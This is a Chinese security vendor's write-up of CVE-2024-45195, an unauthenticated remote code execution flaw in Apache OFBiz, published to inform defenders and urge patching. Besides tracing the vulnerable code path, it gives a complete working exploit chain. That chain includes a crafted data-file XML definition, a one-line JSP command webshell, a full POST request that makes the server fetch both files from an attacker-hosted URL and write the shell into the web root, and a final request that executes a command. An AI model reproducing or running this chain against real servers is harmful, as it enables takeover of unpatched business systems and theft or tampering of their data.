#  Apache ERP开源框架OFBiz高危RCE 漏洞复现分析   
原创 HSCERT  山石网科安全技术研究院   2025-03-15 09:01  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxvbibNMMmxDGrTN0Z9ibYzXnSNKobTzADCPgdo1b7ukKNARFEicHqQiajWw/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
**无需身份验证，攻击者就能轻松拿下你的服务器，你必须立刻知道！**  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在数字化时代，企业的核心业务系统如同一座座数字化城堡，而开源软件则是这些城堡的基石。然而，当基石出现裂缝时，整个城堡的安全都将受到严重威胁。近期，Apache OFBiz——一款广泛应用于企业资源规划（ERP）的开源框架，被曝出一个评分高达9.8的远程代码执行漏洞（CVE-2024-45195）。本文将深入剖析该漏洞的细节，并提供紧急应对措施，帮助大家在危机中守护自己的数字资产。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、漏洞背景**  
  
  
北京时间2024年8月31日，Apache OFBiz官方升级了源代码，修复一个了评分为9.8的严重漏洞。近日，山石网科监测到该CVE漏洞PoC在互联网上披露，风险极大。  
  
  
Apache OFBiz是一个用于企业资源规划（ERP）的开源框架，它包含满足常见业务需求的Web应用程序，例如人力资源、会计、库存管理、客户关系管理、营销等，在Java应用服务器中有非常广泛的部署和应用。在此次披露的严重漏洞中，未经身份验证的远程攻击者通过SSRF漏洞控制请求从而写入恶意文件。攻击者可能利用该漏洞来执行恶意操作，包括但不限于获取敏感信息、修改数据或执行系统命令，最终可导致服务器失陷。风险极大，山石网科应急响应中心提醒Apache OFBiz用户尽快采取安全措施阻止漏洞攻击。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、漏洞评级**  
  
- CVE-2024-45195：严重  
  
- CVSS分数：9.8  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、影响版本**  
  
- Apache OFBiz≤18.12.1  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、漏洞详情**  
  
****  
  
**（一）****漏洞原理******  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
该漏洞利用ControlServlet和RequestHandler函数  
收到不同端点的请求时会进入不同的处理逻辑，逻辑中的缺陷导致路径绕过最终导致未授权漏洞，属于CVE-2024-38856的绕过版本  
。  
  
  
**（二）复现工作**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
ofbiz是以tomcat作为http容器，在\framework\webtools\webapp\webtools\WEB-INF\web.xml中配置了servlet。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXNTVhH7w6l8qQg6vOo1sVPmMy5xoT0BMgzyA58F2fL53CIYEib4aeFvA/640?wx_fmt=png&from=appmsg "")  
  
  
org.apache.ofbiz.webapp.control.ControlServlet会处理所有以/control/开头的URL请求，主要处理逻辑函数是doGet，  
该函数开始都是在对请求的参数进行设置，知道第185行开始，定义了处理器RequestHandler。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXJGX4n7ajswiba2kFEtIbk2PClbSoCjJZScxkgGJnv0qAYib0GFSd5aWA/640?wx_fmt=png&from=appmsg "")  
  
  
到212行调用了handler的doRequest方法：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXu6Zyjelp191mloub8F1Skq2DSn3B5YOJzq7KWl1lDnGITE0mBHzJicQ/640?wx_fmt=png&from=appmsg "")  
  
  
跟进doRequest，273-275行获取了请求的路径并进行切分：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXvfJjN7xBVx8F5n9bkHaGBYiagNlohZOJznc06kx5LoNIJeibh4u0YLpg/640?wx_fmt=png&from=appmsg "")  
  
  
接着跟进resolveURI，从给定的配置对象ccfg中找到与HTTP请求req匹配的请求映射。  
由于最终需要执行renderView函数来执行groovy脚本导致命令执行，所以需要绕过前面的安全检查，通过审计调试可以发现，需要让/control/之后的第一个端点的属性满足securityAuth==false，securityCert==false，才能绕过安全检查。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXyicMrgshPDhImEeAUdwlUoibqWfYUhEhF6v6pBDhspLoia7C5WPMtWREQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXxnER9EyJfDsWX4a1fKns1F5YJBsoPydicpd0dSiaq92EUOqs01koluVw/640?wx_fmt=png&from=appmsg "")  
  
  
然后，  
在下图所示地方下断点后，表达式求值运行一下代码找出所有符合条件的端点。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXQ7rMibQBhYlXN6oIOYbTiaY2bORp1zWmnNVZicCOlMaGWp7Px7H2z55xg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXbsC5mz2HqIpa5kpibmv0iabp1eqVQATuFgxdX4T5Brx4MGhVZfibXmaXw/640?wx_fmt=png&from=appmsg "")  
  
```
BufferedWriter writer = new BufferedWriter(new FileWriter("output.txt"));
try {
    for(int i=0;i<requestMapMap.values().size();i++){
        RequestMap requestMap= (RequestMap) ((LinkedList) requestMapMap.values().toArray()[i]).toArray()[0];
        if (requestMap.securityAuth==false &&
            requestMap.securityCert== false &&
            (requestMap.requestResponseMap.get("success").type.equals("view") ||
            (requestMap.requestResponseMap.get("success").type.equals("request") && requestMap.requestResponseMap.get("success").value.equals("/view"))||
            (requestMap.requestResponseMap.get("success").type.equals("request") && requestMap.requestResponseMap.get("success").value.equals("main")))) {
            String key = ((RequestMap) ((LinkedList) requestMapMap.values().toArray()[i]).toArray()[0]).uri;
            writer.write(String.valueOf(i)+":"+ String.valueOf(key));
            writer.newLine();
        }
    }
} finally {
    writer.close();
}

```  
  
  
  
```
25:myCertificates
38:chain
59:main
65:view
77:showDateTime
99:TestService
147:editPortalPageColumnWidth
179:login
180:checkLogin
181:getUiLabels
184:forgotPassword
185:showHelpPublic
188:ListSetCompanies
189:ListLocales
195:views
199:viewBlocked
205:ajaxCheckLogin206:LookupTimeDuration
```  
  
  
其中，login，checkLogin，ajaxCheckLogin虽然能执行到renderView但后续会再检查导致无法绕过。  
之后在执行renderView之前还会检查/control/之后的第二个端点。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXeKqLc3Xu05orVS5UjEbBxoiaicYP0GTR0NG7lqD9qVCiakzXEBMQETwNw/640?wx_fmt=png&from=appmsg "")  
  
  
renderView会对视图进行渲染，他会根据/control/之后的第二个端点名称判断是否是脚本文件，是的话会调用相应的.groovy脚本执行。Apache OFBiz从18.12.15版本开始，对ProgramExport.groovy和EntitySQLProcessor.groovy都做了安全检查。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXvBIaTHHWYfuic6QCrZ8GHXUQPia7EKldUR6ZGJ9RvtQ30QIo2tYlhU8w/640?wx_fmt=png&from=appmsg "")  
  
  
现在，将该漏洞的利用点更换成\framework\webtools\groovyScripts\datafile\ViewDataFile.groovy。  
这里可以将读到的dataFile写入dataFileSave指定的路径，所以只需要让dataFile中放jsp木马，dataFileSave的路径为tomcat的web目录就可以写入木马。此外，dataFileSave的值可通过参数DATAFILE_SAVE传入，所以可DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXdlibJhGRwhQqz0cMibjpePC9rOoLS1w6cXnjkw8o500jHJfTaNOlCCibg/640?wx_fmt=png&from=appmsg "")  
  
  
跟进dataFile.writeDataFile：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXj2YuOia9z4FzEtvRV8NCWKIoZDfjLnG4h3a46Njlos0ozpd096uB1lA/640?wx_fmt=png&from=appmsg "")  
  
  
跟进writeDataFile：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXSLs6IiacEBqyLMHEDKRVzp5yhwmtRm73hg18heiaN1q0Vicoe4ebic46qg/640?wx_fmt=png&from=appmsg "")  
  
  
跟进writeLineString：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXnZuaMCEpO5vTk3G8GrJl3KvWJa4y2PYRkQOANkMvI4PneucxQyLfiaw/640?wx_fmt=png&from=appmsg "")  
  
  
跟进getFixedString：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXtshdkkpFBLJvf4eV9w8gdmRmhCm8LIbgUEmfBLzksvibXNIibxv7uu9g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXXUFBEtib1XO0H7ialMpAeBZIa8vCRZYZGRIwuEwx7iasLtCT3w7j4VmdQ/640?wx_fmt=png&from=appmsg "")  
  
  
会根据modelField.name读数据，modelField.name可由DEFINITION_NAME控制，可以把木马放在以modelField.name为键名的hashmap中，比如令DEFINITION_NAME=jspshell，dataFile的值由DataFile.readFile的返回值确定。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBX51pJFGjhBVlt20ezI6Kt5vwX42B7hnprgzh6Qp5hNnBRbHkCfHqYdw/640?wx_fmt=png&from=appmsg "")  
  
  
跟进readFile：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXmewgQZl0IxticymMInzdibRtZEmibKib5AIhWTArX5wUgACbaufz1kRjpg/640?wx_fmt=png&from=appmsg "")  
  
  
跟进makeDataFile：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBX9NPdQVSiaCbQFTPByxZJw6G6whZGKtAE1Eywb5nc2PT4Ppcqdy3ibGQA/640?wx_fmt=png&from=appmsg "")  
  
  
由注释可以知道definitionUrl需要是一个xml文件，xml文件的格式可参照https://cwiki.apache.org/confluence/display/OFBIZ/OFBiz's+Data+File+Tools，跟进getModelDataFileReader。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXEJ53OOM3x0UZB7ty26IkTxqQzoTb3gIibcld6KPicl3lQmZHa1gfAdzg/640?wx_fmt=png&from=appmsg "")  
  
  
ModelDataFileReader会读取xml文件：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXDT6dnly8NYAOibA8uB1ehVRrysekoxmhbA7zMCN0du0gMibIKIQurS4A/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXbTD3EhatEKiaNq6PaJjwS1w1MDO7rEMpiaSK8CA0mu371a4Zr1HATbaA/640?wx_fmt=png&from=appmsg "")  
  
  
然后读取fileUrl的内容，fileUrl由DATAFILE_LOCATION控制。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXbHe2bp36KpMP2hFdWWTQXHI46IMK0Q9Zibz16vHdPt3L4v6LNicQ1q7g/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXJWfRhN6x95a0yIAtu6Hibt88uFcGmV12YND5ZJzwCLelOHvk3l5iaICw/640?wx_fmt=png&from=appmsg "")  
  
  
读到的数据流会通过setupStream进行处理。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXXETxqOe2Dia7micKc8lyCcJEpc3wCq9TENgMo2iaLTqZWlsNPvGLJ8ia8Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
读取的长度是根据前面读到的xml文档的配置读的，所以配置文件中的position设置为0，field的length为要去的文件内容的长度，比如写入如下木马，则length=60。  
  
  
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>  
  
读完之后会根据xml中field的name来存储成键值对，需要name的值和DEFINITION_NAME对应才可以读到，所以xml中reacord的name设置为"jspshell"。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXzcFQ5KBVXibiaM3ibG3AQHsw0n7gicNTql05cHiaS25icFmSwic7gSwjYowxw/640?wx_fmt=png&from=appmsg "")  
  
  
最后为了让dataFileUrl和definitionUrl由我们控制，需要令DATAFILE_IS_URL=true，DEFINITION_IS_URL=true  
  
。  
  
  
**（三）漏洞复现结果**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8WFHRW8Evk0zcqAPJSmSRktqm69UXCNGtz8L1sz1g1Wg3sEYViamG90Q/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
最终复现如下：  
- rceschema.xml  
  
```
<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <data-file name="jspshell" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
            <record name="jspshell" limit="many">
                <field name="jspshell" type="String" length="60" position="0"></field>
            </record>
        </data-file>
</data-files>

```  
  
  
  
- rcereport.txt  
  
```
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```  
  
  
```
POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
Host: 127.0.0.1:8443
Cookie: OFBiz.Visitor=10002
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:JSESSIONID=4D720CE66E5228B4E3EFEDBA1A8D07C1.jvm1;OFBiz.Visitor=10002
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 246

DATAFILE_LOCATION=http://127.0.0.1:8000/rcereport.txt&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://127.0.0.1:8000/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=jspshell

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXpHiaZuicy0hgzYF3IoTiaAUYiaj7ldJXb14oibU4Bgl1vTiacyQsywEFzkCQ/640?wx_fmt=png&from=appmsg "")  
  
  
最后，  
访问https://127.0.0.1:8443/accounting/index.jsp?cmd=calc。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRT4L5APoY4fEZy1sSY8fBXJds2gewQh4E3k5jXp8PmuZxUO99icWhAicWerjQe9SxfTTCCQcgPiaapw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、安全建议**  
  
  
升级Apache OFBiz到18.12.16及以上版本  
  
。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、相关链接**  
  
  
[1]https://github.com/apache/ofbiz-framework  
  
[2]https://forum.butian.net/index.php/article/586?_refluxos=a10  
  
[3]https://forum.butian.net/article/524  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8KrXv9sZf93yt4huq2kARyZSgmdnic40GayohIYiaD2FAkkAqJehJSMtQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
山石网科是中国网络安全行业的技术创新领导厂商，由一批知名网络安全技术骨干于2007年创立，并以首批网络安全企业的身份，于2019年9月登陆科创板（股票简称：山石网科，股票代码：688030）。  
  
现阶段，山石网科掌握30项自主研发核心技术，申请540多项国内外专利。山石网科于2019年起，积极布局信创领域，致力于推动国内信息技术创新，并于2021年正式启动安全芯片战略。2023年进行自研ASIC安全芯片的技术研发，旨在通过自主创新，为用户提供更高效、更安全的网络安全保障。目前，山石网科已形成了具备“全息、量化、智能、协同”四大技术特点的涉及边界安全、云安全、数据安全、业务安全、内网安全、智能安全运营、安全服务、安全运维等八大类产品服务，50余个行业和场景的完整解决方案。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/NGIAw2Z6vnLzibrp7C4HmazCNIQXMJIRxPibycdiaNQCI4PNojUk3eYCQDZs6c5zNMUkq7yFNeYQIxicAV33eHNdFA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
